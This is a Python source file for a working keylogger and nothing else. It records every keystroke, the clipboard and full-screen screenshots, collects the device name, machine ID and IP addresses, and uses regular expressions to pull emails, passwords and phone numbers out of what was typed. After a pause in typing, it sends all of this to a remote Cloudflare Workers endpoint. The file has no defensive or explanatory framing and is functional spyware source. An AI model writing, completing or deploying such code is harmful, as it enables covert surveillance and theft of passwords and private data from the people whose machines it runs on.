import io
from pynput.keyboard import Key, Listener
import json
from datetime import datetime
import threading
import re
import pyperclip
import machineid
import platform
import socket
from PIL import ImageGrab
import requests
ORIGIN_SERVER = "https://keylogger-api.kalusenpai.workers.dev"
caps_lock_on = False
content = ""
last_key_time = None
write_timer = None

def parse_content(content):
    emails = re.findall(r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+", content)
    passwords = re.findall(r"/^(?=.*[0-9])(?=.*[a-z])(?=.*[A-Z])(?=.*\W)(?!.* ).{6,}$/", content)
    phone_numbers = re.findall(r"\d{10}", content)
    return {
        "emails": emails,
        "passwords": passwords,
        "phone_numbers": phone_numbers
    }

def get_screenshot():
    screenshot = ImageGrab.grab()
    screenshot_bytes = io.BytesIO()
    screenshot.save(screenshot_bytes, format='PNG')
    screenshot_bytes.seek(0)
    return screenshot_bytes

def get_ips():
    try:
        hostname = socket.gethostname()
        private_ip = socket.gethostbyname(hostname)
    except socket.error:
        private_ip = "Unavailable"
    try:
        response = requests.get("https://httpbin.org/ip")
        response.raise_for_status()
        public_ip = response.json().get("origin", "Unavailable")
    except requests.RequestException:
        public_ip = "Unavailable"
    
    return {"private_ip": private_ip, "public_ip": public_ip}


def prepare_data():
    global content
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")
    log = {}
    clipboard = pyperclip.paste()
    log[time] = {
        "raw": content,
        "clipboard": clipboard,
        "data": parse_content(content)
    }
    device_name = platform.node()
    device_id = machineid.id()
    device_ip = get_ips()
    screenshot = get_screenshot()
    content = ""
    return {
        "device_name": device_name,
        "device_id": device_id,
        "IPs": device_ip,
        "log": log,
        "screenshot": screenshot
    }


def send_data_to_server():
    data = prepare_data()
    file = {"file" : ("screenshot.png", data["screenshot"], "image/png")}
    log_data = {
        "device_name": data["device_name"],
        "device_id": data["device_id"],
        "IPs": data["IPs"],
        "log": data["log"]
    }
    response = requests.post(
        f"{ORIGIN_SERVER}/api/logs",
        files=file,
        data={"log_data": json.dumps(log_data)}
    )
    if response.status_code == 200:
        print("Data sent successfully")
    else:
        print("Failed to send data")

# def write_data_to_file():
#     global content
#     time = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")
#     data = {}

#     try:
#         with open("logs.json", "r") as log:
#             data = json.load(log)
#     except (FileNotFoundError, json.JSONDecodeError):
#         data = {}

#     clipboard = pyperclip.paste()
#     data[time] = {
#         "raw": content,
#         "clipboard": clipboard,
#         "data": parse_content(content)
#     }
#     with open("logs.json", "w") as log:
#         json.dump(data, log, indent=4)
#     content = ""

def reset_timer():
    global write_timer
    if write_timer is not None:
        write_timer.cancel()
    write_timer = threading.Timer(10.0, send_data_to_server)
    write_timer.start()


def on_press(key):
    global caps_lock_on, content, last_key_time
    try:
        char = key.char.upper() if caps_lock_on else key.char
        content += char
    except AttributeError:
        if key == Key.caps_lock:
            caps_lock_on = not caps_lock_on
        elif key == Key.space:
            content += " "
        elif key == Key.enter:
            content += "\n"
        elif key == Key.backspace or key == Key.delete:
            content = content[:-1]
        elif key not in (Key.shift_l, Key.shift_r):
            content += f" {key} "

    last_key_time = datetime.timestamp(datetime.now())
    reset_timer()

def on_release(key):
    if key == Key.esc:
        if write_timer is not None:
            write_timer.cancel()
        send_data_to_server()
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
